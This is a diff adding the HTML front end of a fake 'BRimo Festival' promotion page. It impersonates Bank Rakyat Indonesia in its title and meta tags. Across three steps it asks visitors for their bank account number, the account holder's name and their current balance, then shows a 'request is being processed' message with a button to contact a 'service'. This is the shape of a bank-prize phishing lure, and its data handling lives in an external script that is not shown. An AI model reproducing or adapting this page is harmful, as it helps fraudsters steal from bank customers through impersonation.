@@ -1,1 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>BRimo Festival</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- Added meta tags for social sharing -->
+    <meta property="twitter:title" content="𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜 | 𝗕𝗥𝗜𝗺𝗼 𝗙𝗦𝗧𝗩𝗟">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta content="https://hosting.tigerengine.id/lvit0j.jpg" property="og:image">
+    <!-- New meta tags for BRI information -->
+    <meta property="og:title" content="PT. Bank Rakyat Indonesia (Persero) Tbk.">
+    <meta property="og:description" content="Gedung BRI Jl. Jenderal Sudirman Kav.44-46 Jakarta 10210 Indonesia">
+</head>
+<body>
+    <!-- Rest of your existing body content remains unchanged -->
+    <div class="container">
+        <!-- Header Image -->
+        <div class="header-image">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEig8lJ2TAjG3Frf_4E42lP3LEw4KyecrTH1gDWKv1TKALAwbNg_UcEsGSYKN1sb3nisb_reXgAFPi1OyPGWixuw1jdOl7rttdBAf-cnv9zXEdfl_EX0OxxFTJy86y7cyJsayGx1XNgifWwmC8oYkqbxb9EKb1vlQxBoTDGgOFy0ht7Cnpj6K_radbnUD9g/s1080/AddText_06-08-12.57.52.jpg" alt="BRimo Festival Header">
+        </div>
 
+        <!-- Loading Animation -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loading-content">
+                <img src="https://hosting.tigerengine.id/f01dmo.gif" alt="Loading" class="loading-gif">
+            </div>
+        </div>
+
+        <!-- Page 1: Input Account Number and Name -->
+        <div class="page active" id="page1">
+            <div class="header-section">
+                <div class="logo">
+                    <h1>BRimo Festival</h1>
+                </div>
+                <div class="input-box">
+                    <div class="input-with-icon">
+                        <input type="tel" id="accountNumber" placeholder="Masukkan Nomor Rekening" required 
+                               inputmode="numeric" pattern="[0-9]*">
+                        <div class="input-icon"></div>
+                    </div>
+                    <div class="input-with-icon">
+                        <input type="text" id="accountName" placeholder="Masukkan Nama Pemilik Rekening" required 
+                               inputmode="text" autocapitalize="words">
+                        <div class="input-icon"></div>
+                    </div>
+                    <div class="button-group">
+                        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPMG51wBFdQ7Z4vAwkWv6iU9ngLcr2leCxU2gu3Ecr_crCP7YYHH9rVErcOlbG1_WNWHC6G27SrosA7O6WohIQhVvJ4-TiPusQ3ZXsol9v82xkTFVQvJBvkFUxfdSrJiYBMr_rpK06licvnRf4KBt5EW9-f28wZIMir_4pdrhsYvfuHHQZ8-NbYaCUA1w/s805/AddText_09-15-12.32.19.png" alt="Lanjut" id="next1" class="next-image-button">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 2: Input Balance -->
+        <div class="page" id="page2">
+            <div class="carousel-container">
+                <div class="carousel-slide">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxCRq5kYI02TNaetRYwt8pVxVNOadEGqM8WzQMWTvJVIaSho1GM1K8HF0&s=10" alt="Promo 1">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcScfzBDjNEyURTEV7GJgJFevdSa0UpRjKV5F3ml-D3rX2ZA_MzRr8WTGc8&s=10" alt="Promo 2">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlAEZq-iGAf8eygri_x2VfJOJ5_JrwZZf1jy5naAzFHEGXAIEUD65ZN-ZF&s=10" alt="Promo 3">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCfHyt6eZ5csB0NrZnpgkWSYNJ5YOoHHk1Q98jgh8FPLuF9YW0JgT45gw&s=10" alt="Promo 4">
+                </div>
+            </div>
+            <div class="balance-input-box">
+                <h2>Jumlah Saldo Saat Ini</h2>
+                <div class="input-with-icon">
+                    <input type="text" id="currentBalance" placeholder="Rp" required 
+                           inputmode="numeric" pattern="[0-9]*">
+                    <div class="input-icon"></div>
+                </div>
+                <div id="amountInWords" class="amount-in-words"></div>
+                <div class="button-group">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPMG51wBFdQ7Z4vAwkWv6iU9ngLcr2leCxU2gu3Ecr_crCP7YYHH9rVErcOlbG1_WNWHC6G27SrosA7O6WohIQhVvJ4-TiPusQ3ZXsol9v82xkTFVQvJBvkFUxfdSrJiYBMr_rpK06licvnRf4KBt5EW9-f28wZIMir_4pdrhsYvfuHHQZ8-NbYaCUA1w/s805/AddText_09-15-12.32.19.png" alt="Lanjut" id="next2" class="next-image-button">
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 3: Confirmation -->
+        <div class="page" id="page3">
+            <div class="confirmation-box">
+                <h2>Selamat!</h2>
+                <p>Terima kasih telah berpartisipasi dalam BRimo Festival.</p>
+                <p>Permintaan Anda sedang diproses, mohon tunggu konfirmasi lebih lanjut.</p>
+                <div class="button-group">
+                    <button id="contactService" class="btn">Hubungi Layanan Sekarang</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer Image -->
+        <div class="footer-image">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwzhsQd1K7iF1d2s06-jdlmwaZV6_bR1eZiRCjx7LnbIHag5c5iAEOVfgP9UE-lQqv0M2-C7gQ3u6y6C-0E1iLZASRfrNtk7YOeBa_5obrbvmB4yi2MOjPPseRovva7VTIMmt3dXKcdlSDiqBt5-D_T5W1RiloJ5AOct6wnyv4SZI6Cj6Ahfc2j_x3NZA/s1080/1703668668502.png" alt="BRimo Festival Footer">
+        </div>
+    </div>
+
+    <script src="javascript.js"></script>
+</body>
+      </html>
